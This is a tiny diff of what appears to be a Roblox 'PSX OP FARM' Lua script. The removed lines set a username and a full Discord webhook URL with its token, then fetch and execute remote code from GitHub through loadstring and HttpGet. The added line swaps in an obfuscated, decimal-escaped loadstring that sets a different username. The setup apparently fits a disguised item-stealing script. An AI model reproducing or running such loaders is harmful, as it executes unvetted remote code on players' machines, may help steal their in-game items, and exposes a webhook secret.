@@ -1,5 +1,1 @@
-_G.Username = "LendaNOOB_XD"
-_G.HubName = "PSX OP FARM: WORKING"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1099804352606114044/zSdm3-7kKtCjNEbZe8yUJTjrINo-aqjhK-5krCZo_TS7wgL7IiJB0PlmO8RPGX0XDpww"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))() 
+loadstring("\95\71\46\85\115\101\114\110\97\109\101\32\61\32\34\114\97\116\97\116\111\120\105\49\34")()
